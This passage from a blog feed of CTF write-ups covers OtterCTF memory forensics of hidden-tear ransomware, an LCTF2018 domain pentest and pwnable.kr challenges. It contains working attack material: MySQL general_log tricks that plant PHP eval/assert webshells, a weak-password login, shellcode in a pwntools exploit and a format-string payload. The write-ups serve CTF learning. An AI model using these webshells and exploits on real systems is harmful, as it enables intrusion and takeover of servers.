Morty season 1 download.exe.torrent"</span>Download complete: Rick And Morty season 1 download.exe.torrent. Press Shift+F6 to cycle to the downloads bar area.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash">➜  Desktop strings ./f/* <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"download\.exe\.torrent"</span> -A 10 -B 10display:inline<span class="token punctuation">;</span>width:56px<span class="token punctuation">;</span>height:200px<span class="token punctuation">;</span>m<span class="token operator">></span>Hum@n_I5_Th3_Weak3s7_Link_In_Th3_Ch@inYear//sec-s.uicdn.com/nav-cdn/home/preloader.gifsimple-icon_toolbar-change-view-horizontal nnx-track-sec-click-communication-inboxic.comnx-track-sec-click-dashboard-hide_smileyableNftd-box stem-north big fullsize js-focusablejs-box-flex need-overlay js-componentoneJhttps://search.mail.com/web <span class="token punctuation">[</span>q origin <span class="token punctuation">]</span>Yearntrack-and-trace__delivery-info--has-iconfRick And Morty season 1 download.exe.torrenttbl_1533411035475_7.0.1.40728_2033115181panel-mail-display-table-mail-default35<span class="token string">"Cnpanel-mail-display-table-mail-horizontal.jstrc_rbox text-links-a trc-content-sponsored identity_OjpwcmVsb2FkZXIuaHRtbC50d2lnMove the widget to its desired position.3c8=Set-Cookie, no-store, proxy-revalidateHxRKw=Set-Cookie, no-store, proxy-revalidate143/tbl_1533411035475_7.0.9.40728_2033115181"</span>mail.com Update" <span class="token operator">&lt;</span>service@corp.mail.com<span class="token operator">></span>e<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>##flag</p><pre class="line-numbers language-bash"><code class="language-bash">CTF<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;Hum@n_I5_Th3_Weak3s7_Link_In_Th3_Ch@in&amp;#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="10-Bit-4-Bit-100"><a href="#10-Bit-4-Bit-100" class="headerlink" title="10 - Bit 4 Bit 100"></a>10 - Bit 4 Bit 100</h1><p>##question<br>We’ve found out that the malware is a ransomware. Find the attacker’s bitcoin address.<br>format: CTF{…}</p><p>##solve<br>dump出之前的exe</p><pre class="line-numbers language-bash"><code class="language-bash">➜  Desktop volatility -f OtterCTF.vmem --profile<span class="token operator">=</span>Win7SP1x64 procdump -p 3720 -D ./Volatility Foundation Volatility Framework 2.6Process<span class="token punctuation">(</span>V<span class="token punctuation">)</span>         ImageBase          Name                 Result------------------ ------------------ -------------------- ------0xfffffa801a4c5b30 0x0000000000ec0000 vmware-tray.ex       OK: executable.3720.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后ida拖进去逆下就ok</p><pre class="line-numbers language-bash"><code class="language-bash">    text <span class="token string">"UTF-16LE"</span>, <span class="token string">"Click next for more information and payment on how "</span>    text <span class="token string">"UTF-16LE"</span>, <span class="token string">"to get your files back."</span>,0aButton1:                               // DATA XREF: hidden_tear.Form1__InitializeComponent+1C6↑o                                        // hidden_tear.Form2__InitializeComponent+122↑o <span class="token punctuation">..</span>.    text <span class="token string">"UTF-16LE"</span>, <span class="token string">"button1"</span>,0aNext:                                  // DATA XREF: hidden_tear.Form1__InitializeComponent+1FC↑o    text <span class="token string">"UTF-16LE"</span>, <span class="token string">"Next"</span>,0aPicturebox1:                           // DATA XREF: hidden_tear.Form1__InitializeComponent+25E↑o                                        // hidden_tear.Form3__InitializeComponent+72↑o    text <span class="token string">"UTF-16LE"</span>, <span class="token string">"pictureBox1"</span>,0aThisIcon:                              // DATA XREF: hidden_tear.Form1__InitializeComponent+351↑o    text <span class="token string">"UTF-16LE"</span>, <span class="token string">"<span class="token variable">$this</span>.Icon"</span>,0aForm1:                                 // DATA XREF: hidden_tear.Form1__InitializeComponent+37C↑o    text <span class="token string">"UTF-16LE"</span>, <span class="token string">"Form1"</span>,0aTextbox1:                              // DATA XREF: hidden_tear.Form2__InitializeComponent+99↑o                                        // hidden_tear.Form3__InitializeComponent+120↑o    text <span class="token string">"UTF-16LE"</span>, <span class="token string">"textBox1"</span>,0aTextbox1Text:                          // DATA XREF: hidden_tear.Form2__InitializeComponent+E0↑o    text <span class="token string">"UTF-16LE"</span>, <span class="token string">"textBox1.Text"</span>,0aNext_0:                                // DATA XREF: hidden_tear.Form2__InitializeComponent+158↑o    text <span class="token string">"UTF-16LE"</span>, <span class="token string">"Next,"</span>,0aForm2:                                 // DATA XREF: hidden_tear.Form2__InitializeComponent+201↑o    text <span class="token string">"UTF-16LE"</span>, <span class="token string">"Form2"</span>,0aCheckingPaymen:                        // DATA XREF: hidden_tear.Form3__button1_Click+1↑o    text <span class="token string">"UTF-16LE"</span>, <span class="token string">"Checking Payment.................Please Wait"</span>,0aPleaseWait:                            // DATA XREF: hidden_tear.Form3__button1_Click+6↑o    text <span class="token string">"UTF-16LE"</span>, <span class="token string">"Please wait"</span>,0aYourPaymentHas:                        // DATA XREF: hidden_tear.Form3__button1_Click+11↑o    text <span class="token string">"UTF-16LE"</span>, <span class="token string">"Your Payment has failed, The funs have been sent ba"</span>    text <span class="token string">"UTF-16LE"</span>, <span class="token string">"ck to your wallet. Please send it again"</span>,0aError:                                 // DATA XREF: hidden_tear.Form3__button1_Click+16↑o    text <span class="token string">"UTF-16LE"</span>, <span class="token string">"Error"</span>,0a1mmpemebjkqxg8:                        // DATA XREF: hidden_tear.Form3__InitializeComponent+163↑o    text <span class="token string">"UTF-16LE"</span>, <span class="token string">"1MmpEmebJkqXG8nQv4cjJSmxZQFVmFo63M"</span>,0aSend016ToTheAd:                        // DATA XREF: hidden_tear.Form3__InitializeComponent+219↑o    text <span class="token string">"UTF-16LE"</span>, <span class="token string">"Send 0.16 to the address below."</span>,0aIPaidNowGiveMe:                        // DATA XREF: hidden_tear.Form3__InitializeComponent+2B5↑o    text <span class="token string">"UTF-16LE"</span>, <span class="token string">"I paid, Now give me back my files."</span>,0aForm3:                                 // DATA XREF: hidden_tear.Form3__InitializeComponent+376↑o    text <span class="token string">"UTF-16LE"</span>, <span class="token string">"Form3"</span>,0aHiddenTearProp:                        // DATA XREF: hidden_tear.Properties.Resources__get_ResourceManager+E↑o    text <span class="token string">"UTF-16LE"</span>, <span class="token string">"hidden_tear.Properties.Resources"</span>,0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>##flag</p><pre class="line-numbers language-bash"><code class="language-bash">CTF<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;1MmpEmebJkqXG8nQv4cjJSmxZQFVmFo63M&amp;#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="11-Graphic’s-For-The-Weak-150"><a href="#11-Graphic’s-For-The-Weak-150" class="headerlink" title="11 - Graphic’s For The Weak 150"></a>11 - Graphic’s For The Weak 150</h1><p>##question<br>There’s something fishy in the malware’s graphics.<br>format: CTF{…}</p><p>##solve<br>要提取图片，我太菜ida搞不动了，只能上dnspy了(ps:还是太菜了没想到，为什么不上一题就用)<br>拖开就能看到<br>##flag</p><pre class="line-numbers language-bash"><code class="language-bash">CTF<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;S0_Just_M0v3_Socy&amp;#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="12-Recovery-300"><a href="#12-Recovery-300" class="headerlink" title="12 - Recovery 300"></a>12 - Recovery 300</h1><p>##question<br>Rick got to have his files recovered! What is the random password used to encrypt the files?</p><p>format: CTF{…}</p><p>##solve<br>form1里面有个sendpassword函数，不过没发送只是用computerName+username</p><pre class="line-numbers language-bash"><code class="language-bash">// hidden_tear.Form1// Token: 0x06000006 RID: 6 RVA: 0x000022E8 File Offset: 0x000004E8public void SendPassword<span class="token punctuation">(</span>string password<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>  string text <span class="token operator">=</span> string.Concat<span class="token punctuation">(</span>new string<span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    this.computerName,    <span class="token string">"-"</span>,    this.userName,    <span class="token string">" "</span>,    password  <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;);</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>strings一下吧</p><pre class="line-numbers language-bash"><code class="language-bash">➜  Desktop strings -el OtterCTF.vmem <span class="token operator">|</span> <span class="token function">grep</span> WIN-LO6FAF3DTFE-Rick  WIN-LO6FAF3DTFE-Rick aDOBofVYUNVnmp7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>##flag</p><pre class="line-numbers language-bash"><code class="language-bash">CTF<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;aDOBofVYUNVnmp7&amp;#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="13-Closure-400"><a href="#13-Closure-400" class="headerlink" title="13 - Closure 400"></a>13 - Closure 400</h1><p>##question<br>Now that you extracted the password from the memory, could you decrypt rick’s files?</p><p>##solve<br>先查看下exe的pdb信息</p><pre class="line-numbers language-bash"><code class="language-bash">➜  Desktop strings executable.3720.exe<span class="token operator">|</span><span class="token function">grep</span> pdbC:\Users\Tyler\Desktop\hidden-tear-master\hidden-tear\hidden-tear\obj\Debug\VapeHacksLoader.pdb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>之前filescan时记得桌面有个flag.txt</p><pre class="line-numbers language-bash"><code class="language-bash">➜  Desktop volatility -f OtterCTF.vmem --profile<span class="token operator">=</span>Win7SP1x64 filescan <span class="token operator">|</span><span class="token function">grep</span> Desktop   Volatility Foundation Volatility Framework 2.60x000000007d660500      2      0 -W-r-- \Device\HarddiskVolume1\Users\Rick\Desktop\READ_IT.txt0x000000007d74c2d0      2      1 R--rwd \Device\HarddiskVolume1\Users\Rick\Desktop0x000000007d7f98c0      2      1 R--rwd \Device\HarddiskVolume1\Users\Rick\Desktop0x000000007d864250     16      0 R--rwd \Device\HarddiskVolume1\Users\Public\Desktop\desktop.ini0x000000007d8a9070     16      0 R--rwd \Device\HarddiskVolume1\Users\Rick\Desktop\desktop.ini0x000000007d8ac800      2      1 R--rwd \Device\HarddiskVolume1\Users\Public\Desktop0x000000007d8ac950      2      1 R--rwd \Device\HarddiskVolume1\Users\Public\Desktop0x000000007e410890     16      0 R--r-- \Device\HarddiskVolume1\Users\Rick\Desktop\Flag.txt0x000000007e5c52d0      3      0 R--rwd \Device\HarddiskVolume1\Users\Rick\AppData\Roaming\Microsoft\Windows\SendTo\Desktop.ini0x000000007e77fb60      1      1 R--rw- \Device\HarddiskVolume1\Users\Rick\Desktop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先把文件dump出来</p><pre class="line-numbers language-bash"><code class="language-bash">➜  Desktop volatility -f OtterCTF.vmem --profile<span class="token operator">=</span>Win7SP1x64 dumpfiles -Q 0x000000007e410890 -D ./f/Volatility Foundation Volatility Framework 2.6DataSectionObject 0x7e410890   None   \Device\HarddiskVolume1\Users\Rick\Desktop\Flag.txt➜  Desktop <span class="token function">file</span> ./f/file.None.0xfffffa801b0532e0.dat ./f/file.None.0xfffffa801b0532e0.dat: data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>移除文件后面的00 字节用hidden-tear-decrypto工具密码<code>aDOBofVYUNVnmp7</code>解开即得到flag<br>##flag</p><pre class="line-numbers language-bash"><code class="language-bash">CTF<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;Im_Th@_B3S7_RicK_0f_Th3m_4ll&amp;#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf_wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> memory_forensics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>lctf2018-god of domain pentest</title>
      <link href="/2018/11/20/lctf2018-god-of-domain-pentest/"/>
      <url>/2018/11/20/lctf2018-god-of-domain-pentest/</url>
      
        <content type="html"><![CDATA[<h1 id="question"><a href="#question" class="headerlink" title="question"></a>question</h1><pre class="line-numbers language-bash"><code class="language-bash">题目描述：windows域环境权限不好配，还请各位师傅高抬贵手，不要搅屎 c段只用到了0-20，不需要扫21-255，端口也只开放了常用端口。 web.lctf.com中有个域用户是web.lctf.com\buguake,密码是172.21.0.8的本地管理员密码 188.131.161.90<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><a id="more"></a><p>nmap scan in first.Recent web pentest like to give socks5</p><pre class="line-numbers language-bash"><code class="language-bash">➜  ubuntu nmap -p 1000-1100 188.131.161.90Starting Nmap 7.01 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2018-11-20 00:50 CSTNmap scan report <span class="token keyword">for</span> 188.131.161.90Host is up <span class="token punctuation">(</span>0.048s latency<span class="token punctuation">)</span>.Not shown: 97 closed portsPORT     STATE SERVICE1083/tcp <span class="token function">open</span>  ansoft-lm-11084/tcp <span class="token function">open</span>  ansoft-lm-21088/tcp <span class="token function">open</span>  cplscrambler-al1089/tcp <span class="token function">open</span>  ff-annuncNmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 14.63 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>go with proxy！ </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">export</span> all_proxy<span class="token operator">=</span>socks5://188.131.161.90:1083<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Visit <a href="http://172.21.0.1/">http://172.21.0.1</a></p><pre class="line-numbers language-html"><code class="language-html">Hello World<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>try for <a href="http://172.21.0.1/phpinfo.php">http://172.21.0.1/phpinfo.php</a><br><img src="/img/2018/11/20/172.21.0.8-phpinfo.php.png" alt="phpinfo"></p><p>found it with phpstudy,try login phpmyadmin with weak password</p><pre class="line-numbers language-bash"><code class="language-bash">root root phpmyadminroot root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>use general_log </p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token string">'&lt;?php @eval($_POST[cmd]);?>'</span><span class="token keyword">INTO</span> <span class="token keyword">OUTFILE</span> <span class="token string">'c:/phpStudy/PHPTutorial/WWW/cmd.php'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>result</p><pre class="line-numbers language-c"><code class="language-c">#<span class="token number">1290</span> <span class="token operator">-</span> The MySQL server is running with the <span class="token operator">--</span>secure<span class="token operator">-</span>file<span class="token operator">-</span>priv option so it cannot execute this statement<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>change way</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">set</span> <span class="token keyword">global</span> general_log<span class="token operator">=</span><span class="token string">'on'</span><span class="token punctuation">;</span><span class="token keyword">SET</span> <span class="token keyword">global</span> general_log_file<span class="token operator">=</span><span class="token string">'C:/phpStudy/PHPTutorial/WWW/xyzz1.php'</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token string">'&lt;?php assert($_GET["cmd"]);?>'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>get webshell<del>~</del></p><p>visit it</p><pre class="line-numbers language-url"><code class="language-url">http://172.21.0.8/xyzz1.php?cmd=system(%22whoami%22)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-html"><code class="language-html">C:\phpStudy\PHPTutorial\MySQL\bin\mysqld.exe, Version: 5.5.53 (MySQL Community Server (GPL)). started with: TCP Port: 3306, Named Pipe: MySQL Time Id Command Argument 364 Init DB    mysql 364 Query    SELECT 'pupiles-pc\administrator ' 364 Query    SHOW TABLE STATUS FROM `mysql` LIKE 'general\_log%' 364 Query SELECT COUNT(*) FROM `mysql`.`general_log` 364 Query    SHOW CREATE TABLE `mysql`.`general_log` 364 Quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>emmm,the website is closed.give up!<br>from Nu1L’s wp,next with ms17-010 ,ms14-068—-<br>Nu1L’s wp:[wp]<a href="https://xz.aliyun.com/t/3341#toc-18">https://xz.aliyun.com/t/3341#toc-18</a></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web pentest </tag>
            
            <tag> lctf2018 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable-kr-4</title>
      <link href="/2018/10/30/pwnable-kr-4/"/>
      <url>/2018/10/30/pwnable-kr-4/</url>
      
        <content type="html"><![CDATA[<h1 id="1-tiny-easy"><a href="#1-tiny-easy" class="headerlink" title="1.tiny_easy"></a>1.tiny_easy</h1><h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>shellcode  <span class="token operator">=</span> <span class="token string">"\xeb\x11\x5e\x31\xc9\xb1\x32\x80"</span>shellcode <span class="token operator">+=</span> <span class="token string">"\x6c\x0e\xff\x01\x80\xe9\x01\x75"</span>shellcode <span class="token operator">+=</span> <span class="token string">"\xf6\xeb\x05\xe8\xea\xff\xff\xff"</span>shellcode <span class="token operator">+=</span> <span class="token string">"\x32\xc1\x51\x69\x30\x30\x74\x69"</span>shellcode <span class="token operator">+=</span> <span class="token string">"\x69\x30\x63\x6a\x6f\x8a\xe4\x51"</span>shellcode <span class="token operator">+=</span> <span class="token string">"\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"</span>payload <span class="token operator">=</span> <span class="token string">"\x90"</span> <span class="token operator">*</span> <span class="token number">8000</span> <span class="token operator">+</span> shellcode<span class="token comment" spellcheck="true">#p64(0xff9c3844)</span>env <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;&amp;#125;</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    env<span class="token punctuation">[</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> payload<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span>p32<span class="token punctuation">(</span><span class="token number">0xff9c3844</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>executable<span class="token operator">=</span><span class="token string">"./tiny_easy"</span><span class="token punctuation">,</span> env<span class="token operator">=</span>env<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><a id="more"></a><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><pre class="line-numbers language-bash"><code class="language-bash">What a tiny task :<span class="token punctuation">)</span> good job<span class="token operator">!</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="2-fsb"><a href="#2-fsb" class="headerlink" title="2.fsb"></a>2.fsb</h1><h2 id="question"><a href="#question" class="headerlink" title="question"></a>question</h2><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;alloca.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> key<span class="token punctuation">;</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">char</span> buf2<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">fsb</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> envp<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span> pargv <span class="token operator">=</span> <span class="token operator">&amp;</span>argv<span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span> penvp <span class="token operator">=</span> <span class="token operator">&amp;</span>envp<span class="token punctuation">;</span>        <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> arg<span class="token punctuation">;</span>        <span class="token keyword">char</span><span class="token operator">*</span> c<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>arg<span class="token operator">=</span>argv<span class="token punctuation">;</span><span class="token operator">*</span>arg<span class="token punctuation">;</span>arg<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token keyword">for</span><span class="token punctuation">(</span>c<span class="token operator">=</span><span class="token operator">*</span>arg<span class="token punctuation">;</span> <span class="token operator">*</span>c<span class="token punctuation">;</span>c<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token operator">*</span>c<span class="token operator">=</span><span class="token string">'\0'</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>arg<span class="token operator">=</span>envp<span class="token punctuation">;</span><span class="token operator">*</span>arg<span class="token punctuation">;</span>arg<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token keyword">for</span><span class="token punctuation">(</span>c<span class="token operator">=</span><span class="token operator">*</span>arg<span class="token punctuation">;</span> <span class="token operator">*</span>c<span class="token punctuation">;</span>c<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token operator">*</span>c<span class="token operator">=</span><span class="token string">'\0'</span><span class="token punctuation">;</span>    <span class="token operator">*</span>pargv<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token operator">*</span>penvp<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Give me some format strings(%d)\n"</span><span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Wait a sec...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"key : \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf2<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> pw <span class="token operator">=</span> <span class="token function">strtoull</span><span class="token punctuation">(</span>buf2<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>pw <span class="token operator">==</span> key<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Congratz!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">execve</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> args<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Incorrect key \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> envp<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/urandom"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> fd<span class="token operator">==</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>key<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">8</span> <span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Error, tell admin\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">alloca</span><span class="token punctuation">(</span><span class="token number">0x12345</span> <span class="token operator">&amp;</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fsb</span><span class="token punctuation">(</span>argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// exploit this format string bug!</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>##solve</p><pre class="line-numbers language-bash"><code class="language-bash">fsb@ubuntu:~$ ./fsb <span class="token operator">></span> /dev/null%134520836c%14<span class="token variable">$n</span>%134514347c%20<span class="token variable">$n</span><span class="token function">cat</span> flag<span class="token operator">></span><span class="token 